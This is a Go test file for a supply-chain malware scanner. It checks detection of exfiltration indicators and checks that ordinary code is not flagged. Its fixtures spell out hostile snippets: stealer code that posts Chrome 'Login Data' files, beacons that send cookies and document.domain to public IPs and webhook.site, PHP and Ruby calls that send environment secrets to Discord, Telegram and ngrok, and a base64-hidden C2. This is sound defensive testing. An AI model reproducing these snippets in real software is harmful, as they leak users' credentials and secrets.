package iocscan

import (
	"encoding/base64"
	"strings"
	"testing"
)

func files(m map[string]string) map[string][]byte {
	out := make(map[string][]byte, len(m))
	for k, v := range m {
		out[k] = []byte(v)
	}
	return out
}

func TestScan_Malicious(t *testing.T) {
	cases := map[string]map[string]string{
		"discord webhook (dispositive)": {
			"pkg/__init__.py": "import requests\nrequests.post('https://discord.com/api/webhooks/123/abc', json={'x': 1})\n",
		},
		"telegram bot exfil": {
			"pkg/m.py": "url = 'https://api.telegram.org/bot123:AAH/sendMessage'\n",
		},
		"ngrok tunnel sink": {
			"pkg/c2.js": "const c2 = 'https://abc123.ngrok-free.app/collect';\n",
		},
		"paste drop": {
			"pkg/x.py": "open('p','wb').write(requests.get('https://transfer.sh/abc/p').content)\n",
		},
		"oob interactsh host": {
			"pkg/x.py": "requests.get('http://x.oast.fun/')\n",
		},
		"stealer string + send (coupled)": {
			"pkg/grab.py": "import os, requests\np = os.path.expanduser('~/.config/google-chrome/Default/Login Data')\nrequests.post('http://example.com/u', data=open(p,'rb').read())\n",
		},
	}
	for name, fs := range cases {
		if r := Scan(files(fs)); !r.Detected {
			t.Errorf("%s: expected detection, got none", name)
		}
	}
}

// TestScan_ReputationHost pins detection-roadmap item 4: a host on the offline
// reputation feed, referenced in source COUPLED with an actual outbound send,
// fires the strong "reputation_host" kind (reusing the MaliciousIOC wiring). A
// BARE reference (no send) stays clean (advisory only). Well-known CDNs /
// registries are allowlisted and never match even if they were on the feed.
func TestScan_ReputationHost(t *testing.T) {
	t.Run("feed host + send -> reputation_host", func(t *testing.T) {
		// paste.bingner.com is a seeded feed host; coupled with urlopen.
		fs := files(map[string]string{
			"pkg/__init__.py": "import urllib.request\nurllib.request.urlopen('https://paste.bingner.com/raw/abcd', data=b'x')\n",
		})
		r := Scan(fs)
		if !r.Detected {
			t.Fatalf("expected detection on feed-host+send, got none")
		}
		if r.Kind != "reputation_host" {
			t.Errorf("kind = %q, want reputation_host (%s)", r.Kind, r.Detail)
		}
	})

	t.Run("feed host as bare reference (no send) stays clean", func(t *testing.T) {
		// A reference with no outbound send is advisory only — must not fire.
		fs := files(map[string]string{
			"README.md": "Historic IOC: paste.bingner.com was used by a 2022 campaign.\n",
		})
		if r := Scan(fs); r.Detected {
			t.Errorf("bare feed-host reference should stay clean, got %s (%s)", r.Kind, r.Detail)
		}
	})

	t.Run("IP feed host + send -> reputation_host", func(t *testing.T) {
		// https: an http:// public IP literal that sends is exfil_host now
		// (TestScan_PublicIPv4C2), so this exercises the feed's IP equality.
		fs := files(map[string]string{
			"pkg/x.py": "import requests\nrequests.post('https://54.254.189.27/api/v1/file/upload', data=b'x')\n",
		})
		r := Scan(fs)
		if !r.Detected {
			t.Fatalf("expected detection on IP-feed-host+send, got none")
		}
		if r.Kind != "reputation_host" {
			t.Errorf("kind = %q, want reputation_host (%s)", r.Kind, r.Detail)
		}
	})

	t.Run("exfil_host still wins over reputation_host", func(t *testing.T) {
		// A dedicated exfil sink (Tier 1) must take precedence over a generic
		// reputation hit so the more specific kind is reported.
		fs := files(map[string]string{
			"pkg/__init__.py": "import requests\nrequests.post('https://discord.com/api/webhooks/1/abc', data=b'x')\nx = 'paste.bingner.com'\n",
		})
		r := Scan(fs)
		if r.Kind != "exfil_host" {
			t.Errorf("kind = %q, want exfil_host (more specific should win)", r.Kind)
		}
	})
}

// TestScan_ReputationFeedAllowlist verifies a CDN/registry host is never
// matched as a reputation hit, even coupled with a send — the allowlist guard
// against false positives on legitimate package fetches.
func TestScan_ReputationFeedAllowlist(t *testing.T) {
	// Build a scanner whose feed deliberately includes an allowlisted host to
	// prove the allowlist suppresses it.
	m := newReputationMatcherFromLines([]string{
		"registry.npmjs.org", // allowlisted — must NOT match
		"evil-c2.example",    // not allowlisted — must match
	})
	cleanFS := files(map[string]string{
		"pkg/__init__.py": "import requests\nrequests.get('https://registry.npmjs.org/lodash')\n",
	})
	if hit, _ := m.match(cleanFS, true); hit {
		t.Errorf("allowlisted CDN host on feed must not match")
	}
	dirtyFS := files(map[string]string{
		"pkg/__init__.py": "import requests\nrequests.post('https://c2.evil-c2.example/x', data=b'y')\n",
	})
	if hit, _ := m.match(dirtyFS, true); !hit {
		t.Errorf("non-allowlisted feed host (subdomain) coupled with send must match")
	}
	// Suffix label-boundary: "notevil-c2.example" must NOT match "evil-c2.example".
	boundaryFS := files(map[string]string{
		"pkg/__init__.py": "import requests\nrequests.post('https://notevil-c2.example/x', data=b'y')\n",
	})
	if hit, _ := m.match(boundaryFS, true); hit {
		t.Errorf("label-boundary: notevil-c2.example must not match feed entry evil-c2.example")
	}
}

func TestScan_LegitStaysClean(t *testing.T) {
	cases := map[string]map[string]string{
		"normal http client lib": {
			"pkg/client.py": "import requests\ndef get(u):\n    return requests.get(u)\n",
		},
		// A browser-cookie library legitimately READS the cred store but does
		// NOT exfil it — the coupling gate keeps it clean.
		"browser-cookie lib reads store, no exfil": {
			"pkg/cookies.py": "import sqlite3\nDB = '~/.mozilla/firefox/cookies.sqlite'\ndef load():\n    return sqlite3.connect(DB)\n",
		},
		"package referencing slack in docs/config (no webhook path)": {
			"pkg/notify.py": "SLACK = 'https://slack.com/api/chat.postMessage'\n",
		},
		"normal config with example.com": {
			"pkg/conf.py": "BASE = 'https://api.example.com/v1'\n",
		},
	}
	for name, fs := range cases {
		if r := Scan(files(fs)); r.Detected {
			t.Errorf("%s: expected clean, got %s (%s)", name, r.Kind, r.Detail)
		}
	}
}

// TestScan_ExfilInNonShippingPathIsWeak pins the tests/docs/vendored downgrade.
//
// The exfil_host tier was documented as "dispositive alone". Measured against
// 860 real top packages that produced hard blocks on langchain-core (its test
// FOR SSRF protection), huggingface-hub (API tests), rapidfuzz (vendored
// bootstrap.js) and textual (a docs example) — packages a developer simply
// cannot install. A test that asserts a URL is refused necessarily contains
// that URL.
func TestScan_ExfilInNonShippingPathIsWeak(t *testing.T) {
	payload := "url = 'https://hooks.slack.com/services/T00/B00/XXX'\n"

	weak := []string{
		"pkg-1.0/tests/unit_tests/test_ssrf_protection.py",
		"pkg-1.0/test/api_test.py",
		"pkg-1.0/docs/examples/guide/input/key03.py",
		"pkg-1.0/extern/taskflow/js/bootstrap/4.4.1/bootstrap.js",
		"pkg-1.0/vendor/thing/client.go",
		"pkg-1.0/node_modules/dep/index.js",
		"pkg-1.0/pkg/client_test.go",
		"pkg-1.0/pkg/test_client.py",
	}
	for _, name := range weak {
		t.Run("weak/"+name, func(t *testing.T) {
			r := Scan(map[string][]byte{name: []byte(payload)})
			if !r.Detected {
				t.Fatalf("indicator should still be REPORTED, not dropped: %s", name)
			}
			if !r.Weak {
				t.Errorf("hit in non-shipping path should be Weak (warn, not block): %s", name)
			}
		})
	}

	shipping := []string{
		"pkg-1.0/pkg/client.py",
		"pkg-1.0/src/prompt_toolkit/input/win32.py",
		"pkg-1.0/setup.py",
		"pkg-1.0/contrib/telegram.py",
	}
	for _, name := range shipping {
		t.Run("shipping/"+name, func(t *testing.T) {
			r := Scan(map[string][]byte{name: []byte(payload)})
			if !r.Detected || r.Weak {
				t.Errorf("hit in shipping code must stay dispositive (Detected && !Weak): %s got %+v", name, r)
			}
		})
	}
}

// TestScan_ShippingHitWinsOverWeakHit — a package with the indicator in BOTH a
// test and its shipping code must still hard-block. The weak tier must never
// mask a real hit elsewhere in the same archive, regardless of map order.
func TestScan_ShippingHitWinsOverWeakHit(t *testing.T) {
	payload := []byte("send('https://webhook.site/abc')\n")
	for i := 0; i < 50; i++ { // map iteration order is randomised; repeat
		r := Scan(map[string][]byte{
			"p/tests/test_x.py": payload,
			"p/p/real.py":       payload,
		})
		if !r.Detected || r.Weak {
			t.Fatalf("shipping-code hit must win over the test-path hit; got %+v", r)
		}
	}
}

// TestScan_LocalStateProseIsNotACredentialPath pins the casing fix: the English
// phrase "local state" in a comment must not look like Chrome's `Local State`
// credential file. This blocked opentelemetry-api and oauthlib at install time.
func TestScan_LocalStateProseIsNotACredentialPath(t *testing.T) {
	prose := map[string][]byte{
		"p/ctx.py": []byte("# restore the local state of the span context\nrequests.post(u)\n"),
	}
	if r := Scan(prose); r.Detected {
		t.Errorf("prose 'local state' must not be a credential-store hit; got %+v", r)
	}
	real := map[string][]byte{
		"p/steal.py": []byte(`p = "~/Library/Application Support/Google/Chrome/Local State"` + "\nrequests.post(u, data=open(p,'rb'))\n"),
	}
	if r := Scan(real); !r.Detected || r.Kind != "stealer_string" {
		t.Errorf("a real Chrome Local State path coupled with a send must still fire; got %+v", r)
	}
}

// TestScan_StealerInNonShippingPathIsWeak extends the tests/docs/vendored
// downgrade to tier 2. Until 2026-08-24 isNonShippingPath was consulted ONLY on
// the exfil_host path, so a stealer string anywhere in the archive — including
// a docs example — produced a full-strength hard block.
//
// The live case was textual@8.2.8: docs/examples/guide/input/key03.py defines a
// RichLog subclass named `KeyLogger`, which hits keyloggerRE's `\bkeylogg`.
// textual couples trivially (any `.send(` or `fetch(` satisfies netSendRE) and
// has NO stealer match anywhere in its shipping code, so a documentation class
// name refused the install.
//
// WHY THE ASYMMETRY MATTERS. The two directions are not symmetric and must be
// pinned separately, because the attacker's move against this downgrade is to
// put the payload under a path that LOOKS non-shipping. The downgrade is only
// safe because it is scoped to packages whose stealer evidence is EXCLUSIVELY
// non-shipping: one match in real code and the verdict goes back to full
// strength, regardless of how many test-path matches accompany it. A weak-wins
// bug would be invisible in the FP number (it only ever lowers the rate) and
// would silently open exactly that hole — so "shipping stays strong" is the
// assertion that guards the fix, not the fix itself.
func TestScan_StealerInNonShippingPathIsWeak(t *testing.T) {
	// keyloggerRE + a netSendRE-satisfying line, i.e. the coupled tier-2 shape.
	payload := "class KeyLogger(RichLog):\n    def on_key(self, event):\n        self.write(event)\n        self.post_message(x)\n        fetch(url)\n"

	weak := []string{
		"textual-8.2.8/docs/examples/guide/input/key03.py",
		"pkg-1.0/tests/test_keys.py",
		"pkg-1.0/examples/demo.py",
		"pkg-1.0/vendor/thing/keys.js",
		"pkg-1.0/pkg/keys_test.go",
	}
	for _, name := range weak {
		t.Run("weak/"+name, func(t *testing.T) {
			r := Scan(map[string][]byte{name: []byte(payload)})
			if !r.Detected {
				t.Fatalf("indicator should still be REPORTED, not dropped: %s", name)
			}
			if r.Kind != "stealer_string" {
				t.Fatalf("kind = %q, want stealer_string (%s)", r.Kind, r.Detail)
			}
			if !r.Weak {
				t.Errorf("stealer hit in non-shipping path should be Weak (warn, not block): %s", name)
			}
		})
	}

	shipping := []string{
		"pkg-1.0/src/pkg/keys.py",
		"pkg-1.0/pkg/grab.js",
		"pkg-1.0/setup.py",
	}
	for _, name := range shipping {
		t.Run("shipping/"+name, func(t *testing.T) {
			r := Scan(map[string][]byte{name: []byte(payload)})
			if !r.Detected || r.Kind != "stealer_string" || r.Weak {
				t.Errorf("stealer hit in shipping code must stay dispositive "+
					"(Detected && !Weak): %s got %+v", name, r)
			}
		})
	}
}

// TestScan_ShippingStealerWinsOverWeakStealer — the tier-2 counterpart of
// TestScan_ShippingHitWinsOverWeakHit. A package carrying the stealer string in
// BOTH a docs example and its shipping code must still hard-block, whichever
// file the randomised map walk reaches first.
func TestScan_ShippingStealerWinsOverWeakStealer(t *testing.T) {
	payload := []byte("class KeyLogger:\n    pass\n" + `p = "~/Library/Application Support/Google/Chrome/Local State"` + "\nfetch(url)\n")
	for i := 0; i < 50; i++ { // map iteration order is randomised; repeat
		r := Scan(map[string][]byte{
			"p/docs/examples/key03.py": payload,
			"p/p/real.py":              payload,
		})
		if !r.Detected || r.Kind != "stealer_string" || r.Weak {
			t.Fatalf("shipping-code stealer hit must win over the docs-path hit; got %+v", r)
		}
		if r.Detail != "p/p/real.py" {
			t.Fatalf("Detail should name the shipping file, got %q", r.Detail)
		}
	}
}

// TestExfilHostCoupled pins the field the risk engine reads. A sink the same
// file sends to is coupled; a sink that is only named (yt-dlp's list of
// unsupported sites, ngrok's type declarations) is not, and still reports as
// exfil_host so the guard's behaviour is unchanged.
func TestExfilHostCoupled(t *testing.T) {
	cases := []struct {
		name  string
		files map[string][]byte
		want  bool
	}{
		{"python stealer posts to webhook", map[string][]byte{
			"pkg/setup.py": []byte("import requests\nrequests.post('https://discord.com/api/webhooks/1/x', data=d)\n"),
		}, true},
		{"node beacon to webhook", map[string][]byte{
			"package/index.js": []byte("const https=require('https');\nhttps.get('https://webhook.site/abc?h='+h);\n"),
		}, true},
		{"site list names the host", map[string][]byte{
			"yt_dlp/extractor/unsupported.py": []byte("_TESTS = [{'url': 'https://gofile.io/d/abc'}]\n"),
		}, false},
		{"type declaration names the host", map[string][]byte{
			"package/index.d.ts": []byte("/** e.g. https://abc.ngrok.io */\nexport declare function connect(): string;\n"),
		}, false},
		{"coupled file wins over a named-only file", map[string][]byte{
			"package/docs.js":  []byte("// see https://webhook.site/abc\n"),
			"package/index.js": []byte("fetch('https://webhook.site/abc', {method:'POST'})\n"),
		}, true},
	}
	for _, tc := range cases {
		t.Run(tc.name, func(t *testing.T) {
			r := Scan(tc.files)
			if !r.Detected || r.Kind != "exfil_host" || r.Weak {
				t.Fatalf("got %+v, want a shipping exfil_host hit", r)
			}
			if r.Coupled != tc.want {
				t.Fatalf("Coupled = %v, want %v (%s)", r.Coupled, tc.want, r.Detail)
			}
		})
	}
}

// TestScan_PublicIPv4C2 pins the bare-IP beacon: helpersutils-dev-tools
// (2026-09) sent document.domain to http://5.189.173.113:8899/csp-edu on
// require. A public IPv4 literal behind http:// in shipping code that also
// sends is an exfil_host hit; private, loopback, link-local, CGNAT and the
// well-known resolvers are not, and neither is a test, docs or no-send file.
func TestScan_PublicIPv4C2(t *testing.T) {
	beacon := "fetch('http://5.189.173.113:8899/csp-edu?d=' + document.domain)\n"
	for name, fs := range map[string]map[string]string{
		"js beacon on require": {"package/index.js": beacon},
		"python post":          {"pkg/__init__.py": "import requests\nrequests.post('http://45.61.1.2/u', data=b'x')\n"},
		"node http.get":        {"package/lib.js": "const http = require('http');\nhttp.get(\"http://45.61.1.2:80\")\n"},
	} {
		r := Scan(files(fs))
		if !r.Detected || r.Kind != "exfil_host" || !r.Coupled || r.Weak {
			t.Errorf("%s: want coupled exfil_host, got %+v", name, r)
		}
	}
	if r := Scan(files(map[string]string{"package/index.js": beacon})); r.Detail != "package/index.js: http://5.189.173.113" {
		t.Errorf("detail should name the file and IP: %q", r.Detail)
	}
	for name, fs := range map[string]map[string]string{
		"test fixture":       {"package/test/fixtures.js": beacon},
		"docs":               {"package/docs/usage.md": beacon},
		"no send":            {"package/index.js": "const u = 'http://5.189.173.113:8899/csp-edu'\n"},
		"LAN SDK":            {"pkg/router.py": "import requests\nrequests.get('http://192.168.1.1/api')\n"},
		"rfc1918 10/8":       {"pkg/a.py": "requests.get('http://10.0.0.5:8080/')\n"},
		"rfc1918 172.16/12":  {"pkg/a.py": "requests.get('http://172.20.0.1/')\n"},
		"loopback":           {"package/dev.js": "fetch('http://127.0.0.1:3000/')\n"},
		"cloud metadata":     {"pkg/aws.py": "requests.get('http://169.254.169.254/latest/meta-data/')\n"},
		"cgnat":              {"pkg/a.py": "requests.get('http://100.64.0.1/')\n"},
		"zero net":           {"package/a.js": "fetch('http://0.0.0.0:8080/')\n"},
		"google dns":         {"package/a.js": "fetch('http://8.8.8.8/')\n"},
		"cloudflare dns":     {"package/a.js": "fetch('http://1.1.1.1/')\n"},
		"quad9":              {"package/a.js": "fetch('http://9.9.9.9/')\n"},
		"ip-shaped hostname": {"package/a.js": "fetch('http://5.189.173.113.nip.io/')\n"},
		"https is not this":  {"package/a.js": "fetch('https://5.189.173.113/')\n"},
		"not an address":     {"package/a.js": "fetch('http://999.1.1.1/')\n"},
	} {
		if r := Scan(files(fs)); r.Detected {
			t.Errorf("%s: want clean, got %+v", name, r)
		}
	}
}

// TestScan_ICPCanisterRaw: CanisterWorm (2026-03) and pgserve (2026-04) used
// raw Internet Computer canisters as C2 and drop. The canister-id form under
// raw.icp0.io / raw.ic0.app is an exfil_host; ICP SDK prose and the
// certified boundary hosts are not.
func TestScan_ICPCanisterRaw(t *testing.T) {
	for name, fs := range map[string]map[string]string{
		"pgserve drop": {"package/scripts/check-env.cjs": "const https=require('https');\nconst C='https://cjn37-uyaaa-aaaac-qgnva-cai.raw.icp0.io/drop';\nhttps.request(C,{method:'POST'});\n"},
		"python poll":  {"pkg/service.py": "import urllib.request\nC2='https://tdtqy-oyaaa-aaaae-af2dq-cai.raw.icp0.io/'\nurllib.request.urlopen(C2)\n"},
		"ic0.app raw":  {"package/a.js": "fetch('https://rdmx6-jaaaa-aaaaa-aaadq-cai.raw.ic0.app/x')\n"},
	} {
		if r := Scan(files(fs)); !r.Detected || r.Kind != "exfil_host" || !r.Coupled {
			t.Errorf("%s: want coupled exfil_host, got %+v", name, r)
		}
	}
	for name, fs := range map[string]map[string]string{
		"sdk prose":         {"package/lib/agent.js": "// raw URLs look like https://<canister-id>.raw.icp0.io\nfetch(host)\n"},
		"boundary node":     {"package/lib/agent.js": "const host='https://icp-api.io';fetch('https://ic0.app/api/v2/status')\n"},
		"certified dapp":    {"package/a.js": "fetch('https://rdmx6-jaaaa-aaaaa-aaadq-cai.icp0.io/')\n"},
		"longer first part": {"package/a.js": "fetch('https://xrdmx6-jaaaa-aaaaa-aaadq-cai.raw.icp0.io/')\n"},
	} {
		if r := Scan(files(fs)); r.Detected {
			t.Errorf("%s: want clean, got %+v", name, r)
		}
	}
}

// TestScan_ImageBeacon: helpersutils-dev-tools (MAL-2026-16465) beaconed with
// `new Image().src=`, not fetch(). That couples the public-IP rule and the
// exfil_host tier; a bare IP or a bare .src assignment still does not fire.
func TestScan_ImageBeacon(t *testing.T) {
	for name, fs := range map[string]map[string]string{
		"documented":     {"package/index.js": "(function(){var i=new Image();i.src='http://5.189.173.113:8899/csp-edu?d='+encodeURIComponent(document.domain);})();\n"},
		"one-liner":      {"package/bypass.js": "new Image().src=\"http://5.189.173.113:8899/csp?d=\"+document.domain;\n"},
		"script src":     {"package/a.js": "var s=document.createElement('script');s.src='http://45.61.1.2/p.js';document.head.appendChild(s);\n"},
		"webhook beacon": {"package/a.js": "new Image().src='https://webhook.site/abc?c='+document.cookie;\n"},
	} {
		if r := Scan(files(fs)); !r.Detected || r.Kind != "exfil_host" || !r.Coupled {
			t.Errorf("%s: want coupled exfil_host, got %+v", name, r)
		}
	}
	for name, fs := range map[string]map[string]string{
		"bare ip, no send":   {"package/index.js": "const DEFAULT='http://5.189.173.113:8899/';module.exports=DEFAULT;\n"},
		"image, private ip":  {"package/a.js": "new Image().src='http://192.168.1.10/pixel.gif';\n"},
		"image, no ip":       {"package/a.js": "var i=new Image();i.src=url;\n"},
		"comparison not set": {"package/a.js": "if(img.src=='http://5.189.173.113/x'){}\n"},
	} {
		if r := Scan(files(fs)); r.Detected {
			t.Errorf("%s: want clean, got %+v", name, r)
		}
	}
}

// TestScan_Base64Literal: CanisterWorm (2026-03) kept its canister C2 inside a
// base64 Python payload. Quoted base64 literals that decode to text are read
// by the host and IP rules; a send in the file or in the decoded text
// couples. Binary (an inlined PNG), data: URIs and hashes are not decoded.
func TestScan_Base64Literal(t *testing.T) {
	b := func(s string) string { return base64.StdEncoding.EncodeToString([]byte(s)) }
	py := "import urllib.request\nC2='https://tdtqy-oyaaa-aaaae-af2dq-cai.raw.icp0.io/'\nurllib.request.urlopen(C2).read()\n"
	for name, tc := range map[string]struct {
		body    string
		coupled bool
	}{
		"send only in decoded": {"const P='" + b(py) + "';\nrequire('fs').writeFileSync(f, Buffer.from(P,'base64'));\n", true},
		"send only in file":    {"const u=Buffer.from(\"" + b("https://discord.com/api/webhooks/1/abc") + "\",'base64').toString();fetch(u,{method:'POST'});\n", true},
		"no send anywhere":     {"module.exports='" + b("see https://webhook.site/abc for the token") + "';\n", false},
	} {
		r := Scan(files(map[string]string{"package/index.js": tc.body}))
		if !r.Detected || r.Kind != "exfil_host" || r.Coupled != tc.coupled || !strings.HasSuffix(r.Detail, " (in base64)") {
			t.Errorf("%s: want exfil_host coupled=%v (in base64), got %+v", name, tc.coupled, r)
		}
	}
	if r := Scan(files(map[string]string{"package/a.js": "fetch(x);const c='" + b("http://5.189.173.113:8899/csp?d=") + "';\n"})); !r.Detected || !r.Coupled {
		t.Errorf("public IP in base64 with a send: want coupled exfil_host, got %+v", r)
	}
	png := string([]byte{0x89, 'P', 'N', 'G', 0x0d, 0x0a, 0x1a, 0x0a}) + strings.Repeat("\x00\x01https://webhook.site/x", 4)
	for name, body := range map[string]string{
		"binary blob": "fetch(u);const img='" + base64.StdEncoding.EncodeToString([]byte(png)) + "';\n",
		"data uri":    "fetch(u);const img='data:text/plain;base64," + b("https://webhook.site/abcdefghijklmnop") + "';\n",
		"benign text": "fetch(u);const t='" + b("Copyright (c) Example. See https://github.com/example/lib") + "';\n",
		"sha1 hex":    "fetch(u);const h='da39a3ee5e6b4b0d3255bfef95601890afd80709';\n",
	} {
		if r := Scan(files(map[string]string{"package/a.js": body})); r.Detected {
			t.Errorf("%s: want clean, got %+v", name, r)
		}
	}
	if r := Scan(files(map[string]string{"package/test/a.js": "const P='" + b(py) + "';\n"})); !r.Weak {
		t.Errorf("base64 hit in a test file must stay weak, got %+v", r)
	}
}

// TestScan_PHPRubySends: laravel-lang (2026-05) posted from an autoloaded
// helpers.php; SleeperGem (2026-07) used Net::HTTP. PHP and Ruby send calls
// couple an exfil host or a public IP; file_get_contents on a path does not.
func TestScan_PHPRubySends(t *testing.T) {
	for name, fs := range map[string]map[string]string{
		"php curl_exec":      {"src/helpers.php": "<?php\n$h = curl_init('https://discord.com/api/webhooks/1/x');\ncurl_setopt($h, CURLOPT_POSTFIELDS, json_encode(getenv()));\ncurl_exec($h);\n"},
		"php file_get_url":   {"src/a.php": "<?php file_get_contents('http://45.61.1.2/c?d=' . base64_encode(serialize($_ENV)));\n"},
		"php wordpress post": {"wp-content/plugins/x/x.php": "<?php wp_remote_post('https://api.telegram.org/bot1:A/sendMessage', ['body' => $creds]);\n"},
		"php fsockopen":      {"src/a.php": "<?php $s = fsockopen('x.oast.fun', 80); fwrite($s, getenv('DB_PASSWORD'));\n"},
		"ruby Net::HTTP":     {"lib/dendreo.rb": "require 'net/http'\nNet::HTTP.post(URI('https://discord.com/api/webhooks/1/x'), ENV.to_h.to_s)\n"},
		"ruby URI.open":      {"lib/a.rb": "require 'open-uri'\nURI.open('http://45.61.1.2/s?h=' + `hostname`)\n"},
		"ruby TCPSocket":     {"lib/a.rb": "s = TCPSocket.new('abc123.ngrok.io', 4444)\ns.write(ENV.to_h.to_s)\n"},
		"python .pth line":   {"evil.pth": "import urllib.request; urllib.request.urlopen('http://45.61.1.2/b')\n"},
	} {
		if r := Scan(files(fs)); !r.Detected || r.Kind != "exfil_host" || !r.Coupled {
			t.Errorf("%s: want coupled exfil_host, got %+v", name, r)
		}
	}
	for name, fs := range map[string]map[string]string{
		"php reads a local file": {"src/a.php": "<?php $c = file_get_contents(__DIR__ . '/config.php'); // http://45.61.1.2 in docs\n"},
		"ruby names an IP":       {"lib/a.rb": "DEFAULT_PROXY = 'http://45.61.1.2:3128'\n"},
		"ruby suffix list":       {"lib/domain_name/etld_data.rb": "ETLD_DATA = {\n  'ngrok.io' => 0,\n  'x.ngrok.io' => 0,\n}\n"},
		"ruby metaprogramming":   {"lib/a.rb": "obj.send(:post, 'https://discord.com/api/webhooks/1/x')\n"},
		"ruby stealer strings":   {"lib/os/windows_exports.rb": "EXPORTS = %w[GetAsyncKeyState]\nobj.send(:x)\n"},
	} {
		if r := Scan(files(fs)); r.Detected {
			t.Errorf("%s: want clean, got %+v", name, r)
		}
	}
	for n, want := range map[string]bool{"src/helpers.php": true, "lib/x.RB": true, "site.pth": true, "a.js": false, "a.phpx": false} {
		if WantsScriptSource(n) != want {
			t.Errorf("WantsScriptSource(%q) != %v", n, want)
		}
	}
}
